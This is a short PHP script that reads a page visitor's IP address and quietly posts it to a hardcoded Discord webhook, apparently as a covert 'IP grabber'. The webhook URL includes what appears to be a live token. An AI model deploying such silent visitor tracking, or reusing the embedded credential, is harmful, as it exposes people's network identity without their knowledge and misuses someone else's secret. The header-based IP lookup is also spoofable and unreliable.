<?php

// Function to get the client IP address
function getClientIP() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

// Function to send data to Discord webhook
function sendToDiscord($webhookUrl, $data) {
    $ch = curl_init($webhookUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

// Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
$discordWebhookUrl = 'https://discord.com/api/webhooks/1200967292087963780/1jS-kDQs9qn9lY2ZTyYByeMTI_kLM6mhHBiwLTvO-VNPfAPVByLYkXe4MPuayksIFAHy';

// Get the visitor's IP address
$visitorIP = getClientIP();

// Prepare data to be sent to Discord
$discordData = array(
    'content' => 'Vfunnyess: ' . $visitorIP
);

// Send data to Discord webhook
$response = sendToDiscord($discordWebhookUrl, $discordData);

// Optionally, you can print the Discord response for debugging
// echo $response;

?>
